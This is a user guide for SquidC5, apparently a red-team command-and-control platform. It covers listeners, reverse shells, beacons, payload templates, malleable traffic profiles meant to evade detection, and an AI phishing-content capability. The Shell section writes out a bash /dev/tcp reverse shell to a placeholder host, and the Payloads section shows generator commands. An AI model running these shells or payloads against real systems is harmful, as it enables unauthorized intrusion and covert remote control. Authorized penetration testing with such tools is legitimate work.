# SquidC5 User Guide

**Authorized red team / penetration testing only.**  
This guide lives in the GitHub repository. It is **not** served by the C2 process (`/docs` on the server stays disabled).

**Source of truth:** [docs/user-guide.md](https://github.com/DotNetRussell/SquidC5/blob/master/docs/user-guide.md) on branch `master`.

| Related docs | Purpose |
|--------------|---------|
| [Operator runbook](operator-runbook.md) | Short how-to procedures |
| [Deployment](deployment.md) | Docker lab + binary prod |
| [Vision](squidc5-vision.md) | Product / security architecture |
| [Threat model](threat-model.md) | Trust boundaries |
| [Roadmap](roadmap-2026-2027.md) | Planned work |

---

## Overview

### What SquidC5 is

SquidC5 is a **security-first, AI-native command-and-control (C2)** platform for **authorized** engagements. Operators use:

- **REST API** (scoped tokens)
- **Ops UI** at `/ops` (browser console)
- **CLI** `sc5` / `squidc5-cli`

### Why it is designed this way

- **Deny by default** — MCP off, public OpenAPI off, empty CORS, admin UI only after server-side scope check
- **Deterministic implants** — templates and fixed generators over free-form agent loops
- **Auditability** — operator, AI, MCP, and feature changes go through policy/audit
- **Port flexibility** — no hard requirement for 80/443

### High-level architecture

```text
Operator (CLI /ops)
    → API (scopes + policy)
        → Sessions / Tasks / Listeners / Payloads
        → Admin AI (sandboxed) / MCP (allow-listed)
        → SQLite data/ (local, never commit)
Implants / reverse shells → Listeners → Sessions
```

---

## Security model

### What

- **Tokens** `sc5_<urlsafe>` with scopes (`admin`, `sessions:read`, `shell:interact`, …)
- **Admin UI code** (`console.js`) only after the server validates the token
- **Admin AI** sanitizes untrusted input; capabilities are allow-listed
- **MCP** tools are per-token allow-listed; feature often off by default
- **Public docs** hard-locked off on the running server

### Why

A compromised browser or leaked non-admin token must not receive admin control surface or open-ended AI tooling.

### How

```bash
# Bootstrap token (first start) — store securely, rotate
cat data/admin_token.txt   # local
# docker exec squidc5 cat /data/admin_token.txt

sc5 login --url http://HOST:8443 --token sc5_...
sc5 whoami
```

---

## Ops console

### What

Browser UI at `http://HOST:8443/ops`. Connection settings stay in **browser localStorage** only. Layout order, wide tiles, and panel open state are also local — **never** persisted to the C2 server.

### Why

Operators need a phone-friendly and desktop console without shipping secrets back into git or requiring server-side UI preferences.

### How

1. Open `/ops` on the C2 host (same-origin avoids CORS issues).
2. Paste **API token** → **Save & Connect**.
3. Connection panel collapses when a token is saved.
4. Drag **⋮⋮** to reorder cards; **⟷** expands a card to a full row (local only).

### Example

```text
http://127.0.0.1:8443/ops
Token: sc5_… (from data/admin_token.txt)
```

---

## Connection

### What

Server URL, API token, and refresh interval for the ops UI.

### Why

The UI is a pure client. Without a token, only public shell HTML loads; admin panels load only after `/api/v1/ops/console.js` accepts the token.

### How

| Field | Meaning |
|-------|---------|
| Server URL | Base URL, e.g. `http://159.x.x.x:8443` |
| API token | `sc5_…` Bearer token |
| Refresh | Poll interval for sessions/metrics/events |

### Example (CLI equivalent)

```bash
sc5 login --url http://HOST:8443 --token sc5_...
sc5 config
```

---

## Event stream

### What

Live feed of recent server events (shell connect/verify/reject, listeners, tasks, etc.), newest first.

### Why

Operators watch check-ins without opening full audit or metrics dumps.

### How

Populated from `GET /api/v1/metrics` → `recent_events`. Refreshes with the Connection poll interval.

### Example events

| Type | Meaning |
|------|---------|
| `shell.connected` | Inbound reverse shell TCP accepted |
| `shell.verified` | Exec probe passed |
| `session.rejected` / `shell.false_positive` | Noise/scanner dropped |
| `listener.started` | Listener bound and running |

---

## Status overview

### What

Dashboard tiles: verified shells, listeners up, active sessions, open tasks, HTTP hits, stabilized count, false shells, AI calls, uptime.

### Why

One glance at engagement health before diving into panels.

### How

Aggregates `/api/v1/sessions`, `/api/v1/listeners`, `/api/v1/tasks`, and metrics counters. Height always fits content (not a fixed scroll tile).

---

## Identity

### What

Who the current token is: actor name, type, token id prefix, and **scopes**.

### Why

Scopes gate every panel and API route. Mis-scoped tokens look “broken” until you inspect identity.

### How

- UI: **Whoami** → `GET /api/v1/meta`
- **Health** → `GET /api/v1/health` (no secrets)

### Example

```bash
sc5 whoami
# scopes: admin, sessions:read, shell:interact, ...
```

---

## Shell

### What

Interactive command runner for **verified reverse shells** only.

### Why

Unverified or echo-only sockets are dangerous noise (scanners, TLS handshakes). Exec probe + false-shell filter ensure only real shells get operator commands.

### How

1. Start a `reverse_shell` listener and get a verified session.
2. Select session → enter command → **Run**.
3. **All verified** broadcasts to every verified shell.
4. **Buffer** reads captured session output (`GET /api/v1/sessions/{id}/output`).

### Example

```bash
sc5 listeners create rev 4444 --kind reverse_shell
sc5 listeners start <id>
# target (authorized): bash -i >& /dev/tcp/HOST/4444 0>&1
sc5 sessions list --shells
sc5 shell <session_id> "whoami"
sc5 shell all "id"
```

### Why stage-2 stabilize

Raw reverse shells die on network blips. Auto-stabilize injects a reconnecting agent (Linux Python / Windows PowerShell) that re-checks in and supports reliable command execution.

---

## Sessions

### What

All tracked implant/shell connections (beacons, reverse shells, closed).

### Why

Sessions are the unit of tasking and shell interaction. Reaping drops zombies so operators are not fooled by “live but mute” entries.

### How

| Action | Behavior |
|--------|----------|
| List all | Full session table |
| Reap dead | Probe and close dead/mute shells |
| Close selected | Closes shell chosen in Shell panel |

### Example

```bash
sc5 sessions list
sc5 sessions list --shells --include-dead
sc5 sessions reap
sc5 sessions close <id>
```

---

## Tasks

### What

Async command queue for **beacon** implants (not interactive reverse shells).

### Why

Beacons check in on a schedule. Tasks wait until the next poll, then return results — suitable for intermittent/low-and-slow C2.

### How

1. Get beacon `session_id` from sessions list.
2. Create task with command.
3. Poll task status until complete.

### Example

```bash
sc5 tasks create <beacon_session_id> "id"
sc5 tasks get <task_id>
sc5 tasks list --session <beacon_session_id>
```

---

## Listeners

### What

Server-side acceptors for implant traffic.

### Why

Different channels need different sockets: raw TCP shells vs HTTP beacons vs DNS.

### How to set up

1. **Create** name + port + kind.
2. **Start** until status is `running`.
3. Open host firewall for that port.
4. Point payloads/shells at `HOST:port`.

| Kind | Use |
|------|-----|
| `reverse_shell` | bash `/dev/tcp`, python reverse shells |
| `http` | HTTP beacon check-ins |
| `tcp` | Generic TCP channel |
| `dns` | DNS TXT C2 (set zone) |

### Privileged ports

Non-root process: ports &lt; 1024 need host sysctl  
`net.ipv4.ip_unprivileged_port_start=0`.

### Example

```bash
sc5 listeners create rev 443 --kind reverse_shell --host 0.0.0.0
sc5 listeners start <id>
sc5 listeners list
```

Docker **host** networking binds real host ports. Bridge mode requires publishing every listener port.

---

## Payloads and implants

### What

Deterministic stagers/agents that call back to your listeners.

### Why

Generated payloads are reviewable and reproducible. Prefer templates over opaque loaders for authorized ops and audit.

### How

1. Choose template or implant family.
2. Set callback **host** and **port** (scheme/zone if needed).
3. **Generate** and run **only on authorized targets**.
4. For HTTP surface shape, activate a **C2 profile** first, then generate.

### Example templates

| Template | Listener |
|----------|----------|
| `reverse_shell_bash` / `reverse_shell_python` | `reverse_shell` |
| `http_beacon_python` / `http_beacon_bash` | `http` (often on API port) |
| `dns_beacon_python` | `dns` + zone |
| `ws_beacon_python` | WebSocket routes |

```bash
sc5 payloads templates
sc5 payloads generate reverse_shell_bash 203.0.113.10 4444 --raw
sc5 payloads generate http_beacon_python 203.0.113.10 8443 --raw
```

---

## Plugins

### What

Optional signed/catalog server extensions (e.g. lab recon helpers).

### Why

Keep core binary small; add curated capabilities without open-ended remote code from the internet. Plugins remain allow-listed under policy.

### How

1. **Catalog** — list available modules.
2. **Install + enable** by catalog name.
3. **Installed** — what is loaded.

### Example

```text
Ops → Plugins → Catalog → install "lab_recon" → Install + enable
```

---

## Redirector and certificates

### What

OpSec helpers: nginx reverse-proxy snippet and TLS cert plan text.

### Why

Fronting C2 through a redirector/CDN reduces direct exposure of the team server.

### How

- Enter `server_name` and beacon URI paths.
- **Nginx snippet** → copy to redirector host.
- **Cert plan** → issuance steps (does not auto-issue on the droplet).

### Example

```text
server_name: cdn.lab.example
uris: /jquery.js,/api/sync
→ generate nginx location blocks pointing at team server
```

---

## Observability

### What

Metrics counters and append-only **audit** log of operator/API actions.

### Why

After-action review, dispute resolution, and detection of misuse of the C2 itself.

### How

```bash
sc5 metrics
sc5 audit --limit 50
sc5 events   # SSE stream if available
```

UI: **Metrics** / **Audit log** buttons dump JSON into the panel outbox.

---

## Admin AI

### What

Sandboxed, **allow-listed** AI capabilities on the server (not free-form agents).

### Why

Assist recon docs, shell classification, payload hints — without feeding raw hostile session output into unconstrained agent loops. Untrusted text is sanitized.

### How

1. Configure an LLM under **LLM connections** (optional).
2. Without LLM → offline/deterministic fallbacks.
3. Pick capability + input → **Run AI**.

| Capability | Intent |
|------------|--------|
| `recon_assist` | Structured recon suggestions |
| `shell_classify` | Classify shell/session context |
| `payload_template` | Template guidance |
| `phishing_asset` | Authorized phishing content assist |
| `doc_generate` | Engagement documentation drafts |

### Example

```bash
sc5 ai recon_assist --data "windows domain, no creds yet"
sc5 ai shell_classify --data "session looks like scanner"
```

---

## LLM connections

### What

BYO OpenAI-compatible endpoints (including xAI Grok) stored **server-side** in `data/`.

### Why

Admin AI needs a model; keys must never return in status APIs or git.

### How

```bash
sc5 llm add grok-prod grok-4 --provider xai --base-url https://api.x.ai/v1 --api-key "$XAI_KEY"
sc5 llm list
```

Status: `GET /api/v1/ai/status` shows provider/model presence, **not** the key.

---

## Tokens

### What

Mint and revoke scoped API tokens for operators, automation, or MCP.

### Why

Least privilege: phone UI might only need `shell:interact` + `sessions:read`; external AI needs `mcp:connect` + tool allow-list.

### How

1. Choose preset (operator / read-only / listener / AI / admin / custom).
2. **Mint** — raw `sc5_…` shown **once**.
3. Revoke from list if compromised.

### Example

```bash
sc5 tokens create phone --scopes "sessions:read,shell:interact,metrics:read"
sc5 tokens list
sc5 tokens revoke <id>
```

---

## Timeline and reports

### What

Anomaly hints, chronological timeline, exportable engagement report.

### Why

Handoff and after-action need more than raw audit lines.

### How

Ops panel buttons call observability endpoints (metrics/audit scoped). Export for offline notes — still authorized-use only.

---

## Operator chat

### What

Short shared notes between operators on this instance.

### Why

Handoff without external chat leaking engagement context.

### How

Send message → stored server-side → visible to `collab:use` / admin tokens.

---

## C2 profiles

### What

**Malleable** traffic profiles: how HTTP (and related) beacons look on the wire — paths, headers, jitter, decoy behavior.

### Why

Default C2 fingerprints are easy to detect. Profiles change the expected surface so traffic can blend with legitimate patterns for the engagement.

### How

1. List profiles → **activate** one.
2. **Generate beacon (active)** so implants match that profile.
3. After switching profiles, **regenerate** implants — old beacons may miss the new surface.

### Example

```text
Ops → C2 profiles → activate "jquery-cdn" → Generate beacon (active)
# payload uses profile paths/headers; server expects the same
```

---

## Feature toggles

### What

Runtime kill-switches enforced by the server (MCP, AI paths, etc.).

### Why

Incident response: disable a capability without redeploying. Defaults stay secure; `public_docs` cannot be enabled.

### How

```bash
# API (admin)
curl -H "Authorization: Bearer $TOK" http://HOST:8443/api/v1/features
```

UI: flip toggles → **Save features**.

---

## Policy

### What

Risk / allow-deny engine: thresholds, HITL gates, chain limits.

### Why

High-risk actions can require human approval or be denied outright — rails for AI and automation.

### How

1. **Get policy** — current JSON.
2. Edit carefully → **Save policy**.
3. Bad policy can lock operators out or weaken guardrails — treat as production config.

### Example

```bash
sc5 policy get
sc5 policy set --file rules.json
```

---

## MCP tools

### What

Bridge for **external** AI/tools (Model Context Protocol style) under per-token allow-lists.

### Why

External models must not get open-ended shell on the C2. Each tool call is single-step, scoped, and auditable. MCP is **off by default** until enabled.

### How

1. Enable MCP via features/settings when approved.
2. Token needs `mcp:connect` + `mcp_tools` allow-list.
3. **List tools** / **Call** with JSON args.

### Example

```bash
sc5 mcp tools
sc5 mcp call list_sessions --args-json '{}'
```

---

## Verified reverse shells (overview card)

### What

Live TCP reverse shells that passed classification + exec probe.

### Why

Prefer these for Shell commands. Dead/echo-only connections are reaped.

### How

See [Shell](#shell) and [Listeners](#listeners).

---

## Signal

### What

Quick metric chips from the last poll (stabilized, false positives, AI calls, etc.).

### Why

Confirm the API is healthy and counters are moving without opening Observability.

---

## CLI reference

Primary entry points after install:

```bash
sc5 login --url <base> --token <sc5_...>
sc5 health | whoami | metrics | audit | events | repl
sc5 sessions list|get|close|reap
sc5 tasks list|get|create
sc5 listeners list|create|start|stop|delete
sc5 payloads templates|generate
sc5 shell <session_id> "<cmd>"
sc5 tokens list|create|revoke
sc5 ai <capability> [--data "..."]
sc5 llm list|add
sc5 mcp tools|call
sc5 policy get|set
```

Config: `~/.config/squidc5/config.json` (never commit).  
Env: `SQUIDC5_URL`, `SQUIDC5_TOKEN`.

Full surface also documented in [AGENTS.md](../AGENTS.md) (developer/agent memory).

---

## Deployment

### Lab (Docker)

```bash
docker compose up --build -d
docker exec squidc5 cat /data/admin_token.txt
```

### Production (binary only)

1. PR → CI green → merge `master`
2. CI builds `squidc5-linux-x64` + release
3. Deploy **that binary only**; keep `data/` intact

See [deployment.md](deployment.md). **Do not** rsync WIP source to prod.

---

## Troubleshooting

| Symptom | Checks |
|---------|--------|
| Reverse shell never appears | Listener `running`? Firewall? Port publish (Docker bridge)? Privileged port sysctl? |
| Shell listed but mute | Exec probe failed → reaped; check false-shell filter / stage-2 |
| Admin panels missing | Token scopes? Hard-refresh? `console.js` 403? |
| CORS errors | Open `/ops` on the C2 host, not `file://` or wrong origin |
| Beacon no tasks | Wrong session id? Profile mismatch? Listener kind `http`? |
| AI offline only | No LLM configured under LLM connections |

---

## Authorized use reminder

SquidC5 is for **legitimate, authorized** security testing only. Unauthorized access to computer systems is illegal. Operators are responsible for engagement scope, rules of engagement, and data handling.
